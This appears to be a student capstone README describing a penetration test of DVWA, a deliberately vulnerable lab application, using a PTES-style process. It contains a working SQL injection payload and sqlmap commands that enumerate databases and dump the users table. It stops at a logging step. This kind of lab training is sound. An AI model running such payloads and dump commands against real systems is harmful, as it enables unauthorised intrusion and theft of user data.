<img width="1113" height="506" alt="Screenshot 2026-01-09 215051" src="https://github.com/user-attachments/assets/454ab4d7-135f-4e3a-9026-e00d45f288ff" />**Overview**

This capstone project demonstrates a complete Vulnerability Assessment and Penetration Testing (VAPT) cycle following PTES methodology.
The objective was to simulate a real-world penetration test by identifying, exploiting, validating, and reporting vulnerabilities in a vulnerable web application.

The target application used was DVWA (Damn Vulnerable Web Application).

**Tools Used**

Kali Linux
OpenVAS
sqlmap
DVWA
Metasploit (supporting activities)

**Target Environment**

Target Application: DVWA
Target IP: 192.168.1.200
Security Level: Low
Testing Framework: PTES
**
Step 1: Application Setup (DVWA)
**
DVWA was installed on the local system to simulate a vulnerable web application.
wget https://raw.githubusercontent.com/IamCarron/DVWA-Script/main/Install-DVWA.sh
chmod +x Install-DVWA.sh
sudo ./Install-DVWA.sh

<img width="1107" height="631" alt="Screenshot 2026-01-09 222049" src="https://github.com/user-attachments/assets/3f92eb5b-c715-4347-bc08-86a1ad369475" />

Username: admin
Password: password

**Step 2: Vulnerability Identification (SQL Injection)**

The SQL Injection vulnerability was manually tested through the DVWA interface.
Payload used - ' OR 1=1#
All database users were displayed, confirming SQL Injection vulnerability.

<img width="901" height="484" alt="Screenshot 2026-01-09 213903" src="https://github.com/user-attachments/assets/45ba48e2-1d05-4fa7-8a13-3d8a48340386" />

**
Step 3: Blind SQL Injection Identification
**
Blind SQL Injection was tested where user existence was confirmed without revealing details.

**Step 4: SQL Injection Exploitation Using sqlmap**

To automate exploitation and extract database contents, sqlmap was used.

**Database Enumeration**

    sqlmap "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "security=low; PHPSESSID=2c9ca207a1f2a785b079130cdd41b273" --dbs
<img width="1254" height="651" alt="Screenshot 2026-01-09 214855" src="https://github.com/user-attachments/assets/b631fad6-72f7-4d81-abde-34fc1c28d2b9" />

**Tables Enumeration**
    sqlmap "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "security=low; PHPSESSID=2c9ca207a1f2a785b079130cdd41b273" -D dvwa --tables
<img width="1159" height="665" alt="Screenshot 2026-01-09 214923" src="https://github.com/user-attachments/assets/89e3a2d9-1213-4c07-923a-522957db31ba" />

**Column Enumeration**
   sqlmap "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "security=low; PHPSESSID=2c9ca207a1f2a785b079130cdd41b273" -D dvwa -T users --columns
<img width="1145" height="483" alt="Screenshot 2026-01-09 214946" src="https://github.com/user-attachments/assets/f94f36a5-120d-4d30-998d-0dda4734ea43" />
<img width="777" height="669" alt="Screenshot 2026-01-09 214958" src="https://github.com/user-attachments/assets/69424ea5-62c6-4f30-a025-ad92c421ae4d" />

   
**Data Dump**
    sqlmap "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "security=low; PHPSESSID=2c9ca207a1f2a785b079130cdd41b273" -D dvwa -T users --dump
<img width="1051" height="598" alt="Screenshot 2026-01-09 215039" src="https://github.com/user-attachments/assets/ad9f60f5-a504-4b2a-8039-2bd409ac3639" />
<img width="1113" height="506" alt="Screenshot 2026-01-09 215051" src="https://github.com/user-attachments/assets/2c58df36-0fbf-4dec-a0f9-0265c24e834e" />



**Step 5: Detection & Logging (PTES Mapping)**

Vulnerabilities were logged and mapped to PTES phases.































